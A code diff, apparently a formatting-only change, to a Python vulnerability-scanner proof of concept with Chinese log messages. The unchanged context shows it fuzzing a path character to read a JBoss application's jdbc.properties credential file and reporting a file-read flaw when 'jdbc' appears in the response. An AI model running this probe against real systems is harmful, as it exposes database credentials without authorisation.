@@ -39,9 +39,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -58,7 +59,7 @@ class Poc(ABPoc):
                             fuzz) + ':/FE/jboss/server/default/deploy/fe.war/WEB-INF/classes/jdbc.properties'
                     code, head, res, errcode, _ = hh.http(
                         self.target + payload)
-                    #print unichr(fuzz)
+                    # print unichr(fuzz)
                     if code == 200 and 'jdbc' in res:
                         #security_hole('File read vulnerability '+ arg + payload)
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
